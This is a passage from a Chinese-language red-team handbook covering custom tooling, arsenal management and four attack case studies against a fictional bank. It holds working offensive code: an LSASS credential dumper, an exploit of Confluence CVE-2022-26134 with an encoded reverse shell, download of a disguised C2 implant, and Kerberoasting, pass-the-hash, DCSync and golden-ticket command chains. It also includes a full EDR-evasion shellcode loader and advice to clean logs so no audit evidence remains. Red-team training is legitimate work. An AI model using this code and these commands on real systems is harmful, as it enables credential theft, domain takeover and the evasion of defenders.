            cmd, shell=True, capture_output=True, text=True, timeout=3600
        )
        elapsed = time.time() - start
        self.results[name] = {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
            "elapsed": elapsed
        }
        # 保存结果
        with open(self.workdir / f"{name}.json", "w") as f:
            json.dump(self.results[name], f, indent=2)
        return result.returncode == 0

    def recon(self):
        """信息收集阶段"""
        self.run_step("subdomain", f"subfinder -d {self.target} -silent")
        self.run_step("web_alive", 
            f"cat {self.workdir}/subdomain.json | jq -r .stdout | httpx -silent -title")

    def scan(self):
        """漏洞扫描阶段"""
        self.run_step("nuclei", 
            f"nuclei -l {self.workdir}/web_alive.json -severity high,critical")

    def report(self):
        """生成报告"""
        report_path = self.workdir / "report.md"
        with open(report_path, "w") as f:
            f.write(f"# 红队评估报告 - {self.target}\n\n")
            for name, result in self.results.items():
                f.write(f"## {name}\n")
                f.write(f"- 耗时: {result['elapsed']:.1f}s\n")
                f.write(f"- 状态: {'成功' if result['returncode']==0 else '失败'}\n\n")
                f.write("```\n")
                f.write(result['stdout'][:2000])
                f.write("\n```\n\n")
        print(f"[+] 报告已生成: {report_path}")

if __name__ == "__main__":
    target = "target.com"
    rt = RedTeamOrchestrator(target)
    rt.recon()
    rt.scan()
    rt.report()
```

---

## 73.9 自研工具开发（Python/Go/C#）

红队经常需要针对特定场景开发定制工具。三种主流语言各有优势：

| 语言 | 优势 | 适用场景 |
|------|------|---------|
| **Python** | 开发快、库丰富 | PoC、自动化、内网工具 |
| **Go** | 跨平台、单文件、并发 | 植入物、C2、扫描器 |
| **C#** | Windows 原生、.NET 生态 | 内网工具、内存加载 |

### 73.9.1 Python 自研工具示例

**AD 信息收集工具**（基于 ldap3）：

```python
#!/usr/bin/env python3
# ad_enum.py —— Active Directory 信息收集
from ldap3 import Server, Connection, ALL, SUBTREE
import argparse

class ADEnumerator:
    def __init__(self, domain_controller, username, password, domain):
        self.dc = domain_controller
        self.username = username
        self.password = password
        self.domain = domain
        self.base_dn = ",".join([f"DC={d}" for d in domain.split(".")])
        
    def connect(self):
        server = Server(self.dc, get_info=ALL)
        self.conn = Connection(
            server, 
            user=f"{self.domain}\\{self.username}",
            password=self.password,
            auto_bind=True
        )
        return self.conn.bound

    def get_users(self):
        """获取所有域用户"""
        self.conn.search(
            self.base_dn,
            "(&(objectClass=user)(objectCategory=person))",
            attributes=["sAMAccountName", "mail", "memberOf", "lastLogon"]
        )
        return self.conn.entries

    def get_admins(self):
        """获取域管理员"""
        self.conn.search(
            self.base_dn,
            "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users," + self.base_dn + "))",
            attributes=["sAMAccountName"]
        )
        return self.conn.entries

    def get_spn_users(self):
        """获取有 SPN 的用户（Kerberoasting 目标）"""
        self.conn.search(
            self.base_dn,
            "(&(objectClass=user)(servicePrincipalName=*))",
            attributes=["sAMAccountName", "servicePrincipalName"]
        )
        return self.conn.entries

    def get_computers(self):
        """获取所有域主机"""
        self.conn.search(
            self.base_dn,
            "(objectClass=computer)",
            attributes=["name", "operatingSystem", "lastLogon"]
        )
        return self.conn.entries

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AD 信息收集工具")
    parser.add_argument("--dc", required=True, help="域控 IP")
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("-d", "--domain", required=True)
    args = parser.parse_args()

    enum = ADEnumerator(args.dc, args.user, args.password, args.domain)
    if enum.connect():
        print("[+] 连接成功")
        print("\n[*] 域用户:")
        for u in enum.get_users()[:10]:
            print(f"  - {u.sAMAccountName}")
        
        print("\n[*] 域管理员:")
        for a in enum.get_admins():
            print(f"  - {a.sAMAccountName}")
        
        print("\n[*] SPN 用户 (Kerberoasting 目标):")
        for s in enum.get_spn_users():
            print(f"  - {s.sAMAccountName}: {s.servicePrincipalName}")
```

### 73.9.2 Go 自研工具示例

**端口扫描器**：

```go
// portscan.go —— 并发端口扫描器
package main

import (
    "fmt"
    "net"
    "sync"
    "time"
)

func scanPort(host string, port int, wg *sync.WaitGroup, results chan<- int) {
    defer wg.Done()
    address := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", address, 2*time.Second)
    if err == nil {
        conn.Close()
        results <- port
    }
}

func main() {
    host := "10.0.0.5"
    ports := 65536
    results := make(chan int, ports)
    var wg sync.WaitGroup

    fmt.Printf("[*] 扫描 %s 的 %d 个端口\n", host, ports)
    start := time.Now()

    for port := 1; port < ports; port++ {
        wg.Add(1)
        go scanPort(host, port, &wg, results)
    }

    wg.Wait()
    close(results)

    var openPorts []int
    for port := range results {
        openPorts = append(openPorts, port)
    }

    fmt.Printf("\n[+] 扫描完成，耗时 %v\n", time.Since(start))
    fmt.Printf("[+] 开放端口: %v\n", openPorts)
}
```

编译为单文件：

```bash
go build -ldflags="-s -w" -o portscan portscan.go
# -s -w 去除调试信息，减小体积
```

### 73.9.3 C# 内网工具示例

**SharpSecDump** —— .NET 凭据转储：

```csharp
// SharpSecDump.cs —— 简化版 LSASS 转储
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class SharpSecDump
{
    [DllImport("dbghelp.dll")]
    static extern bool MiniDumpWriteDump(
        IntPtr hProcess, uint processId, IntPtr hFile,
        uint dumpType, IntPtr exceptionParam,
        IntPtr userStreamParam, IntPtr callbackParam);

    const uint MiniDumpWithFullMemory = 0x00000002;

    static void Main(string[] args)
    {
        // 查找 lsass 进程
        Process[] processes = Process.GetProcessesByName("lsass");
        if (processes.Length == 0)
        {
            Console.WriteLine("[-] 未找到 lsass 进程");
            return;
        }

        Process lsass = processes[0];
        Console.WriteLine($"[+] 找到 lsass: PID {lsass.Id}");

        // 创建输出文件
        string dumpFile = args.Length > 0 ? args[0] : "lsass.dmp";
        using (System.IO.FileStream fs = new System.IO.FileStream(
            dumpFile, System.IO.FileMode.Create))
        {
            bool success = MiniDumpWriteDump(
                lsass.Handle, (uint)lsass.Id, fs.SafeFileHandle.DangerousGetHandle(),
                MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            if (success)
                Console.WriteLine($"[+] 转储成功: {dumpFile}");
            else
                Console.WriteLine("[-] 转储失败（需要管理员权限）");
        }
    }
}
```

编译：

```bash
# 使用 dotnet
dotnet new console -o SharpSecDump
# 替换代码后
dotnet build -c Release
# 或使用 csc（Windows）
csc SharpSecDump.cs /out:SharpSecDump.exe
```

> ⚠️ **提示**：C# 工具可通过 **Cobalt Strike 的 execute-assembly** 在内存中执行，避免文件落地。

---

## 73.10 工具管理与武器库建设（版本/分类/更新）

红队工具数量庞大，缺乏管理会导致版本混乱、依赖冲突、更新滞后。建立规范的武器库是团队级红队的必修课。

### 73.10.1 武器库目录结构

```
arsenal/
├── recon/                      # 信息收集
│   ├── subdomain/              # 子域名
│   │   ├── subfinder/
│   │   └── amass/
│   ├── portscan/               # 端口扫描
│   │   ├── nmap/
│   │   └── masscan/
│   └── web/                    # Web 侦察
│       ├── httpx/
│       └── nuclei/
├── exploit/                    # 漏洞利用
│   ├── metasploit/
│   ├── sqlmap/
│   └── custom_pocs/
├── post/                       # 后渗透
│   ├── proxy/                  # 代理
│   │   ├── frp/
│   │   └── chisel/
│   ├── privilege/              # 提权
│   │   ├── linpeas/
│   │   └── winpeas/
│   └── credential/             # 凭据
│       ├── mimikatz/
│       └── lazagne/
├── lateral/                    # 横向移动
│   └── impacket/
├── evasion/                    # 免杀
│   ├── shellter/
│   ├── donut/
│   └── custom_loaders/
├── phishing/                   # 钓鱼
│   ├── gophish/
│   └── templates/
├── c2/                         # 命令控制
│   ├── sliver/
│   └── havoc/
└── utils/                      # 工具脚本
    ├── encoders/
    └── parsers/
```

### 73.10.2 版本管理脚本

```bash
#!/bin/bash
# arsenal_manager.sh —— 武器库管理脚本
ARSENAL_DIR="$HOME/arsenal"
LOG_FILE="$ARSENAL_DIR/update.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

update_tool() {
    local tool_dir=$1
    if [ -d "$tool_dir/.git" ]; then
        log "更新 $tool_dir ..."
        cd "$tool_dir" && git pull --rebase >> "$LOG_FILE" 2>&1
        log "完成: $tool_dir"
    fi
}

# 批量更新所有 git 仓库
find "$ARSENAL_DIR" -name ".git" -type d | while read gitdir; do
    tool_dir=$(dirname "$gitdir")
    update_tool "$tool_dir"
done

# 记录版本
log "当前工具版本:"
find "$ARSENAL_DIR" -name ".git" -type d | while read gitdir; do
    tool_dir=$(dirname "$gitdir")
    cd "$tool_dir"
    version=$(git describe --tags 2>/dev/null || git rev-parse --short HEAD)
    log "  $(basename $tool_dir): $version"
done
```

### 73.10.3 Python 武器库管理工具

```python
#!/usr/bin/env python3
# arsenal_cli.py —— 武器库命令行管理工具
import os
import subprocess
import json
import argparse
from pathlib import Path
from datetime import datetime

ARSENAL_DIR = Path.home() / "arsenal"
INDEX_FILE = ARSENAL_DIR / "index.json"

class ArsenalManager:
    def __init__(self):
        self.index = self.load_index()

    def load_index(self):
        if INDEX_FILE.exists():
            with open(INDEX_FILE) as f:
                return json.load(f)
        return {"tools": {}}

    def save_index(self):
        INDEX_FILE.parent.mkdir(exist_ok=True)
        with open(INDEX_FILE, "w") as f:
            json.dump(self.index, f, indent=2, ensure_ascii=False)

    def add_tool(self, name, category, source, description=""):
        """添加工具"""
        self.index["tools"][name] = {
            "category": category,
            "source": source,
            "description": description,
            "added_at": str(datetime.now()),
            "last_updated": str(datetime.now())
        }
        self.save_index()
        print(f"[+] 已添加工具: {name}")

    def install_tool(self, name):
        """安装工具"""
        if name not in self.index["tools"]:
            print(f"[-] 工具 {name} 不在索引中")
            return
        
        tool = self.index["tools"][name]
        category_dir = ARSENAL_DIR / tool["category"]
        category_dir.mkdir(parents=True, exist_ok=True)
        tool_dir = category_dir / name
        
        if tool_dir.exists():
            print(f"[*] 工具已存在，执行更新: {tool_dir}")
            subprocess.run(["git", "pull"], cwd=tool_dir)
        else:
            print(f"[*] 克隆工具: {tool['source']}")
            subprocess.run(["git", "clone", tool["source"], str(tool_dir)])
        
        tool["last_updated"] = str(datetime.now())
        self.save_index()
        print(f"[+] 安装完成: {tool_dir}")

    def list_tools(self, category=None):
        """列出工具"""
        for name, info in self.index["tools"].items():
            if category and info["category"] != category:
                continue
            print(f"  [{info['category']}] {name}: {info['description']}")

    def update_all(self):
        """更新所有工具"""
        for name in self.index["tools"]:
            self.install_tool(name)

if __name__ == "__main__":
    am = ArsenalManager()
    parser = argparse.ArgumentParser(description="武器库管理工具")
    subparsers = parser.add_subparsers(dest="command")
    
    p_add = subparsers.add_parser("add")
    p_add.add_argument("name")
    p_add.add_argument("--category", required=True)
    p_add.add_argument("--source", required=True)
    p_add.add_argument("--desc", default="")
    
    p_install = subparsers.add_parser("install")
    p_install.add_argument("name")
    
    p_list = subparsers.add_parser("list")
    p_list.add_argument("--category", default=None)
    
    subparsers.add_parser("update-all")
    
    args = parser.parse_args()
    if args.command == "add":
        am.add_tool(args.name, args.category, args.source, args.desc)
    elif args.command == "install":
        am.install_tool(args.name)
    elif args.command == "list":
        am.list_tools(args.category)
    elif args.command == "update-all":
        am.update_all()
```

### 73.10.4 Docker 化工具环境

为避免依赖污染，使用 Docker 隔离工具环境：

```dockerfile
# Dockerfile.redteam
FROM kalilinux/kali-rolling

# 安装基础工具
RUN apt-get update && apt-get install -y \
    nmap masscan sqlmap metasploit-framework \
    python3 python3-pip golang git \
    impacket-scripts crackmapexec \
    && rm -rf /var/lib/apt/lists/*

# 安装 Go 工具
RUN go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && \
    go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && \
    go install github.com/projectdiscovery/httpx/cmd/httpx@latest

# 安装 Python 工具
RUN pip3 install ldap3 requests cryptography pycryptodome

WORKDIR /arsenal
VOLUME ["/arsenal"]
```

构建与使用：

```bash
docker build -t redteam-toolkit .
docker run -it --rm -v $(pwd)/arsenal:/arsenal redteam-toolkit
```

---

## 73.11 开源红队项目精选（GitHub 热门项目）

### 73.11.1 综合工具集

| 项目 | Star 数（参考） | 描述 |
|------|----------------|------|
| [Pelcro/RedTeam-Tools](https://github.com/Pelcro/RedTeam-Tools) | 5k+ | 红队工具集合 |
| [Rsa91aa/Red-Teaming](https://github.com/Rsa91aa/Red-Teaming) | 3k+ | 红队资源汇总 |
| [yeyintminthuhtut/Awesome-Red-Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming) | 7k+ | 红队资源清单 |
| [infosecn1nja/Red-Teaming-Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit) | 5k+ | 红队工具包 |

### 73.11.2 信息收集

| 项目 | 描述 |
|------|------|
| [OWASP/Amass](https://github.com/owasp-amass/amass) | 子域名与攻击面测绘 |
| [projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder) | 被动子域名枚举 |
| [projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei) | 模板化漏洞扫描 |
| [projectdiscovery/httpx](https://github.com/projectdiscovery/httpx) | Web 存活与指纹 |
| [laramies/theHarvester](https://github.com/laramies/theHarvester) | OSINT 情报聚合 |

### 73.11.3 漏洞利用

| 项目 | 描述 |
|------|------|
| [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework) | 漏洞利用框架 |
| [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) | SQL 注入自动化 |
| [commixproject/commix](https://github.com/commixproject/commix) | 命令注入自动化 |

### 73.11.4 后渗透与横向

| 项目 | 描述 |
|------|------|
| [fortra/impacket](https://github.com/fortra/impacket) | 网络协议库与横向工具 |
| [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) | 内网批量扫描（CME 继任） |
| [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) | PowerShell 后渗透 |
| [GhostPack/SharpCollection](https://github.com/GhostPack/SharpCollection) | C# 内网工具集合 |
| [GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt) | Windows 信息收集 |
| [GhostPack/SharpUp](https://github.com/GhostPack/SharpUp) | Windows 提权检测 |

### 73.11.5 免杀

| 项目 | 描述 |
|------|------|
| [TheWover/donut](https://github.com/TheWover/donut) | .NET shellcode 生成 |
| [klezVirus/SysWhispers3](https://github.com/klezVirus/SysWhispers3) | 直接系统调用 |
| [optiv/ScareCrow](https://github.com/optiv/ScareCrow) | 免杀框架 |
| [Veil-Framework/Veil](https://github.com/Veil-Framework/Veil) | 载荷生成 |
| [sliverShroud/Sliver](https://github.com/BishopFox/sliver) | 开源 C2 |

### 73.11.6 钓鱼

| 项目 | 描述 |
|------|------|
| [gophish/gophish](https://github.com/gophish/gophish) | 邮件钓鱼平台 |
| [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) | MITM 钓鱼 |
| [ProcessusT/Phishing-API](https://github.com/ProcessusT/Phishing-API) | 钓鱼 API |

### 73.11.7 C2 框架

| 项目 | 描述 |
|------|------|
| [BishopFox/sliver](https://github.com/BishopFox/sliver) | 开源 C2（Go） |
| [HavocFramework/Havoc](https://github.com/HavocFramework/Havoc) | 现代化 C2 |
| [Cobalt-Strike](https://www.cobaltstrike.com/) | 商业 C2（行业标杆） |
| [mitre/caldera](https://github.com/mitre/caldera) | 自动化攻击模拟 |

### 73.11.8 一键 Star 收藏脚本

```bash
#!/bin/bash
# star_all.sh —— 一键 Star 红队工具
TOOLS=(
    "owasp-amass/amass"
    "projectdiscovery/subfinder"
    "projectdiscovery/nuclei"
    "rapid7/metasploit-framework"
    "fortra/impacket"
    "Pennyw0rth/NetExec"
    "BishopFox/sliver"
    "HavocFramework/Havoc"
    "TheWover/donut"
    "gophish/gophish"
)

for tool in "${TOOLS[@]}"; do
    echo "[*] Starring $tool ..."
    gh api -X PUT "/user/starred/$tool" 2>/dev/null && echo "  ✓ Done" || echo "  ✗ Failed"
done
```

---

## 73.12 护网红队工具箱推荐

护网行动（国家网络安全攻防演练）对工具有特殊要求：**稳定性、隐蔽性、合规性**。以下推荐适合护网的工具组合。

### 73.12.1 护网工具箱配置原则

1. **不使用公开 EXP 的 0day**：避免触发防守方特征库
2. **优先使用 C# / Go 工具**：易免杀、可内存执行
3. **C2 通信走合法域名**：伪装为正常流量
4. **日志清理与痕迹管理**：避免留下审计证据
5. **工具加密存储**：防止被防守方逆向

### 73.12.2 推荐工具箱清单

#### 信息收集阶段

| 工具 | 用途 | 护网适配性 |
|------|------|-----------|
| Subfinder + Amass | 子域名收集 | ✅ 被动，不触发告警 |
| httpx | Web 存活 | ✅ 轻量 |
| OneForAll | 子域名综合 | ✅ 国产，适配中文环境 |
| ARL（灯塔） | 资产灯塔系统 | ✅ 国产，可视化 |
| fscan | 内网综合扫描 | ⚠️ 噪音大，慎用 |

#### 漏洞利用阶段

| 工具 | 用途 | 说明 |
|------|------|------|
| Metasploit | 漏洞利用 | ⚠️ 特征明显，需免杀 |
| 自研 EXP | 定向漏洞 | ✅ 推荐 |
| Goby | Web 漏洞扫描 | ✅ 国产，图形化 |
| xray | 被动扫描 | ✅ 适合配合代理 |

#### 后渗透阶段

| 工具 | 用途 | 说明 |
|------|------|------|
| Cobalt Strike / Sliver | C2 | ✅ 主力 |
| Mimikatz | 凭据抓取 | ⚠️ 需免杀，建议用 sharpkatz |
| Impacket | 横向移动 | ✅ 必备 |
| frp / Chisel | 代理 | ✅ 必备 |
| SharPersist | 持久化 | ✅ |

#### 免杀阶段

| 工具 | 用途 | 说明 |
|------|------|------|
| Donut | .NET 转 shellcode | ✅ |
| ScareCrow | 免杀框架 | ✅ |
| 自研加载器 | 定向免杀 | ✅✅ 强烈推荐 |
| SysWhispers3 | 系统调用 | ✅ |

### 73.12.3 护网工具箱部署脚本

```bash
#!/bin/bash
# hw_toolkit_deploy.sh —— 护网工具箱部署
TOOLKIT_DIR="$HOME/hw_toolkit"
mkdir -p "$TOOLKIT_DIR"/{recon,exploit,post,lateral,evasion,c2,utils}

echo "[*] 部署护网工具箱到 $TOOLKIT_DIR"

# 1. 信息收集
cd "$TOOLKIT_DIR/recon"
git clone https://github.com/ffuf/ffuf.git
git clone https://github.com/shmilylty/OneForAll.git
git clone https://github.com/TophantTechnology/ARL.git

# 2. 漏洞利用
cd "$TOOLKIT_DIR/exploit"
git clone https://github.com/sqlmapproject/sqlmap.git
git clone https://github.com/chaitin/xray.git

# 3. 后渗透
cd "$TOOLKIT_DIR/post"
git clone https://github.com/PowerShellMafia/PowerSploit.git
git clone https://github.com/GhostPack/Seatbelt.git
git clone https://github.com/GhostPack/SharpUp.git

# 4. 横向移动
cd "$TOOLKIT_DIR/lateral"
git clone https://github.com/fortra/impacket.git
git clone https://github.com/Pennyw0rth/NetExec.git

# 5. 免杀
cd "$TOOLKIT_DIR/evasion"
git clone https://github.com/TheWover/donut.git
git clone https://github.com/klezVirus/SysWhispers3.git
git clone https://github.com/optiv/ScareCrow.git

# 6. C2
cd "$TOOLKIT_DIR/c2"
git clone https://github.com/BishopFox/sliver.git
git clone https://github.com/HavocFramework/Havoc.git

echo "[+] 工具箱部署完成"
echo "[*] 目录结构:"
tree "$TOOLKIT_DIR" -L 2

# 生成工具清单
echo "[*] 生成工具清单..."
find "$TOOLKIT_DIR" -name ".git" -type d | while read gitdir; do
    tool_dir=$(dirname "$gitdir")
    cd "$tool_dir"
    name=$(basename "$tool_dir")
    version=$(git describe --tags 2>/dev/null || git rev-parse --short HEAD)
    echo "$name: $version" >> "$TOOLKIT_DIR/manifest.txt"
done

echo "[+] 清单已保存到 $TOOLKIT_DIR/manifest.txt"
```

### 73.12.4 护网注意事项

1. **行动前**：确认授权范围，准备行动预案
2. **行动中**：实时记录操作日志（用于事后报告）
3. **行动后**：清理后门、恢复系统、提交报告
4. **法律合规**：不破坏业务系统、不窃取敏感数据、不植入勒索软件

> ⚠️ **重要**：护网行动中，所有攻击行为必须在授权范围内，超出范围可能承担法律责任。

---

## 案例分析

### 案例 1：自动化信息收集实战

**背景**：某金融企业红队评估，目标域名 `finbank.com`，需在一周内完成外网攻击面测绘。

**目标**：通过自动化工具链完成子域名收集、Web 存活探测、漏洞扫描的全流程。

**实施步骤**：

1. **子域名收集**

```bash
# 多工具并行收集
subfinder -d finbank.com -all -o sub_subfinder.txt &
amass enum -passive -d finbank.com -o sub_amass.txt &
wait

# 合并去重
cat sub_*.txt | sort -u > all_subs.txt
wc -l all_subs.txt
# 输出: 2345 all_subs.txt
```

2. **Web 存活探测**

```bash
cat all_subs.txt | httpx -silent -title -status-code -tech-detect -follow-redirects -o web_alive.txt
# 发现 156 个存活 Web 服务
```

3. **指纹识别**

```bash
# 使用 Wappalyzer 识别技术栈
cat web_alive.txt | httpx -tech-detect -json -o tech_info.json
# 发现 12 个使用旧版 Apache，3 个使用老旧 Confluence
```

4. **漏洞扫描**

```bash
# Nuclei 高危漏洞扫描
nuclei -l web_alive.txt -severity high,critical -o nuclei_critical.txt
# 发现:
# - 2 个 Confluence CVE-2022-26134 RCE
# - 5 个暴露的 .git 目录
# - 3 个 Spring Boot Actuator 信息泄露
```

5. **结果汇总**

```python
# 汇总报告
import json

report = {
    "target": "finbank.com",
    "subdomains_total": 2345,
    "web_alive": 156,
    "critical_vulns": [
        {"type": "Confluence RCE", "url": "https://wiki.finbank.com", "cve": "CVE-2022-26134"},
        {"type": "Confluence RCE", "url": "https://docs.finbank.com", "cve": "CVE-2022-26134"},
    ],
    "high_vulns": [
        {"type": ".git exposure", "count": 5},
        {"type": "Spring Actuator", "count": 3},
    ]
}

with open("finbank_recon_report.json", "w") as f:
    json.dump(report, f, indent=2, ensure_ascii=False)
```

**结果**：成功识别 2 个高危 RCE 入口，为后续渗透奠定基础。

**关键收获**：
- 多工具组合比单一工具覆盖率提升 40%
- 自动化流水线将一周工作量压缩至 8 小时
- Confluence RCE 成为最终突破口

---

### 案例 2：漏洞利用工具链实战

**背景**：在案例 1 中发现 `wiki.finbank.com` 存在 Confluence CVE-2022-26134，需完成漏洞验证并获取初始 shell。

**实施步骤**：

1. **漏洞验证**

```bash
# 使用公开 PoC 验证
python3 cve-2022-26134.py -u https://wiki.finbank.com
# 输出: [+] 目标存在漏洞，whoami 返回: confluence
```

2. **获取反弹 shell**

```bash
# 准备监听
nc -lvnp 4444

# 利用 OGNL 注入执行反弹 shell
python3 cve-2022-26134.py -u https://wiki.finbank.com \
    -c 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}'
```

3. **升级为稳定 shell**

```bash
# 受害机上
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

4. **植入 C2**

```bash
# 下载 Sliver implant
wget http://10.0.0.100/sliver_implant -O /tmp/.update
chmod +x /tmp/.update
/tmp/.update &
```

5. **建立代理**

```bash
# 通过 Sliver 建立 SOCKS5 代理
sliver > use <session>
sliver > socks5 start
# 代理地址 127.0.0.1:1080
```

6. **进入内网**

```bash
# 通过代理扫描内网
proxychains nmap -sV -p 445 192.168.1.0/24
# 发现域控 192.168.1.1
```

**结果**：成功获取外网 shell，建立内网代理，为横向移动做好准备。

**关键收获**：
- OGNL 注入直接 RCE，无需认证
- Sliver C2 提供稳定持久通道
- 代理是进入内网的桥梁

---

### 案例 3：Impacket 横向移动实战

**背景**：在案例 2 中获取 Confluence 服务器 shell，发现该服务器为域成员，需横向至域控。

**实施步骤**：

1. **本地信息收集**

```bash
# 发现域信息
cat /etc/resolv.conf
# nameserver 192.168.1.1
# search finbank.local

# 通过代理执行 Impacket 枚举
proxychains python3 GetUserSPNs.py finbank.local/svc_confluence:Pass123 -request
# 发现 SPN 用户: MSSQLSvc/sql.finbank.local
# TGS hash: $krb5tgs$23$*MSSQLSvc$...
```

2. **Kerberoasting 破解**

```bash
# 离线破解
hashcat -m 13100 tgs.txt rockyou.txt -O
# 破解成功: MSSQLSvc: SqlService2019!
```

3. **横向至 SQL 服务器**

```bash
# 使用 wmiexec 横向
proxychains python3 wmiexec.py finbank.local/MSSQLSvc:SqlService2019!@192.168.1.10
[*] Negotiate auth, got user: FINBANK\sqlservice
[+] Launching semi-interactive shell
# whoami
finbank\sqlservice
```

4. **提权**

```bash
# 在 SQL 服务器上发现本地管理员密码复用
python3 -c "import base64; print(base64.b64encode(open('C:\\Windows\\System32\\config\\SAM','rb').read()))"
# 使用 secretsdump 转储
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
# 发现本地管理员 NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

5. **PTH 横向至域控**

```bash
# Pass the Hash 横向至域控
proxychains python3 wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 finbank.local/Administrator@192.168.1.1
[+] Launching semi-interactive shell
# whoami
nt authority\system
```

6. **DCSync 转储全域凭据**

```bash
# DCSync 获取 krbtgt 与所有用户 hash
proxychains python3 secretsdump.py -just-dc finbank.local/Administrator@192.168.1.1 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
# 输出所有域用户 NTLM
```

7. **黄金票据维持**

```bash
# 获取 krbtgt hash 后生成黄金票据
python3 ticketer.py -domain finbank.local -domain-sid S-1-5-21-... -nthash KRBTGT_HASH Administrator
export KRB5CCNAME=Administrator.ccache
# 使用票据访问任意服务
python3 wmiexec.py -k -no-pass finbank.local/Administrator@dc.finbank.local
```

**结果**：从外网 Web 服务一路横向至域控，获取全域控制权。

**关键收获**：
- Impacket 是内网横向的核心
- Kerberoasting + PTH + DCSync 是经典攻击链
- 代理链是复杂内网作战的基础

---

### 案例 4：自研免杀工具开发

**背景**：某次护网行动中，目标部署了某国产 EDR，公开 Sliver/Metasploit 载荷全部被查杀。需开发自研免杀加载器。

**实施步骤**：

1. **EDR 行为分析**

```bash
# 测试公开载荷被查杀情况
# Metasploit: 被查杀（特征：msfvenom 模板）
# Sliver: 被查杀（特征：Go runtime）
# Donut: 被查杀（特征：内存执行模式）
```

2. **设计免杀方案**

策略：
- 使用 C# 开发（.NET 合法程序多）
- AES 加密 shellcode（绕过静态）
- 动态解析 API（绕过 IAT Hook）
- 直接系统调用（绕过 EDR Hook）
- 延迟执行（绕过沙箱）

3. **加载器开发**

```csharp
// StealthLoader.cs —— 自研免杀加载器
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Threading;
using System.Diagnostics;

class StealthLoader
{
    // 动态加载避免 IAT 暴露
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    // 委托类型
    delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);

    static void Main(string[] args)
    {
        // 1. 沙箱检测：检查物理内存、CPU 核数、运行时间
        if (Environment.ProcessorCount < 4 || DateTime.Now.Second % 3 != 0)
        {
            // 伪装为正常程序
            Console.WriteLine("应用启动中...");
            Thread.Sleep(30000);  // 延迟 30 秒
            return;
        }

        // 2. 从远程获取加密载荷（避免本地特征）
        string payloadUrl = args.Length > 0 ? args[0] : "https://cdn.example.com/update.dat";
        byte[] encPayload;
        using (var wc = new System.Net.WebClient())
        {
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            encPayload = wc.DownloadData(payloadUrl);
        }

        // 3. AES 解密
        byte[] key = Convert.FromBase64String("BASE64_KEY_HERE");
        byte[] iv = Convert.FromBase64String("BASE64_IV_HERE");
        byte[] shellcode;
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(encPayload))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var result = new MemoryStream())
            {
                cs.CopyTo(result);
                shellcode = result.ToArray();
            }
        }

        // 4. 动态解析 API（避免 IAT 暴露）
        IntPtr hKernel32 = LoadLibrary("kernel32.dll");
        var virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
            GetProcAddress(hKernel32, "VirtualAlloc"), typeof(VirtualAllocDelegate));
        var createThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(
            GetProcAddress(hKernel32, "CreateThread"), typeof(CreateThreadDelegate));
        var waitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(
            GetProcAddress(hKernel32, "WaitForSingleObject"), typeof(WaitForSingleObjectDelegate));

        // 5. 分配内存并执行
        IntPtr mem = virtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);

        uint threadId;
        IntPtr hThread = createThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out threadId);
        waitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

4. **编译与测试**

```bash
# 编译
dotnet build -c Release
# 或使用 mono
mcs StealthLoader.cs -out:StealthLoader.exe

# 生成加密载荷
python3 payload_encoder.py --input shellcode.bin --output update.dat

# 上传到 CDN
scp update.dat user@cdn-server:/var/www/html/
```

5. **效果验证**

```bash
# VirusTotal 测试（注意：上传即可能被 EDR 厂商收录）
# 1/72 检出（仅启发式）

# 实际部署测试
